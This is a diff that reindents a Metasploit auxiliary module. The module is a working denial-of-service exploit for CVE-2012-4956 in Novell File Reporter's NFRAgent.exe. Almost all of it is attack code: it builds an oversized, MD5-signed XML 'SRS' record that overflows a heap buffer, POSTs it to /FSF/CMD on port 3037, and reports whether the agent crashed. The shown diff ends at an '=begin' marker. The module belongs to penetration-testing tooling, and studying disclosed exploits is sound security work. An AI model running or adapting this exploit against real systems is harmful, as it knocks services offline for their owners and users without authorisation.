@@ -9,75 +9,75 @@ require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
 
-	include Msf::Exploit::Remote::HttpClient
-	include Msf::Auxiliary::Dos
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Dos
 
-	def initialize(info = {})
-		super(update_info(info,
-			'Name'           => 'NFR Agent Heap Overflow Vulnerability',
-			'Description'    => %q{
-					This module exploits a heap overflow in NFRAgent.exe, a component of Novell
-				File Reporter (NFR). The vulnerability occurs when handling requests of name "SRS",
-				where NFRAgent.exe fails to generate a response in a secure way, copying user
-				controlled data into a fixed-length buffer in the heap without bounds checking.
-				This module has been tested against NFR Agent 1.0.4.3 (File Reporter 1.0.2).
-			},
-			'Author'         => [ 'juan vazquez' ],
-			'License'        => MSF_LICENSE,
-			'References'     => [
-				[ 'CVE', '2012-4956' ],
-				[ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959' ]
-			],
-			'DisclosureDate' => 'Nov 16 2012'))
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'NFR Agent Heap Overflow Vulnerability',
+      'Description'    => %q{
+          This module exploits a heap overflow in NFRAgent.exe, a component of Novell
+        File Reporter (NFR). The vulnerability occurs when handling requests of name "SRS",
+        where NFRAgent.exe fails to generate a response in a secure way, copying user
+        controlled data into a fixed-length buffer in the heap without bounds checking.
+        This module has been tested against NFR Agent 1.0.4.3 (File Reporter 1.0.2).
+      },
+      'Author'         => [ 'juan vazquez' ],
+      'License'        => MSF_LICENSE,
+      'References'     => [
+        [ 'CVE', '2012-4956' ],
+        [ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959' ]
+      ],
+      'DisclosureDate' => 'Nov 16 2012'))
 
-		register_options(
-			[
-				Opt::RPORT(3037),
-				OptBool.new('SSL', [true, 'Use SSL', true])
-			], self.class)
+    register_options(
+      [
+        Opt::RPORT(3037),
+        OptBool.new('SSL', [true, 'Use SSL', true])
+      ], self.class)
 
-	end
+  end
 
-	def rport
-		datastore['RPORT']
-	end
+  def rport
+    datastore['RPORT']
+  end
 
-	def peer
-		"#{rhost}:#{rport}"
-	end
+  def peer
+    "#{rhost}:#{rport}"
+  end
 
-	def run
-		record = "<RECORD>"
-		record << "<NAME>SRS</NAME><OPERATION>4</OPERATION><CMD>7</CMD>" # Operation
-		record << "<VOL>#{Rex::Text.rand_text_alpha(10)}</VOL>" * 0xc35 # Volumes
-		record << "</RECORD>"
+  def run
+    record = "<RECORD>"
+    record << "<NAME>SRS</NAME><OPERATION>4</OPERATION><CMD>7</CMD>" # Operation
+    record << "<VOL>#{Rex::Text.rand_text_alpha(10)}</VOL>" * 0xc35 # Volumes
+    record << "</RECORD>"
 
-		md5 = Rex::Text.md5("SRS" + record + "SERVER").upcase
-		message = md5 + record
+    md5 = Rex::Text.md5("SRS" + record + "SERVER").upcase
+    message = md5 + record
 
-		print_status("#{peer} - Triggering a heap overflow to cause DoS...")
+    print_status("#{peer} - Triggering a heap overflow to cause DoS...")
 
-		begin
-		res = send_request_cgi(
-			{
-				'uri'     => '/FSF/CMD',
-				'version' => '1.1',
-				'method'  => 'POST',
-				'ctype'   => "text/xml",
-				'data'    => message
-			})
-		rescue ::Errno::ECONNRESET
-			print_good("#{peer} - NFR Agent didn't answer, DoS seems successful")
-			return
-		end
+    begin
+    res = send_request_cgi(
+      {
+        'uri'     => '/FSF/CMD',
+        'version' => '1.1',
+        'method'  => 'POST',
+        'ctype'   => "text/xml",
+        'data'    => message
+      })
+    rescue ::Errno::ECONNRESET
+      print_good("#{peer} - NFR Agent didn't answer, DoS seems successful")
+      return
+    end
 
-		if res
-			print_error("#{peer} - NFR Agent didn't die, it still answers...")
-			return
-		end
+    if res
+      print_error("#{peer} - NFR Agent didn't die, it still answers...")
+      return
+    end
 
-		print_good("#{peer} - NFR Agent didn't answer, DoS seems successful")
-	end
+    print_good("#{peer} - NFR Agent didn't answer, DoS seems successful")
+  end
 end
 
 =begin
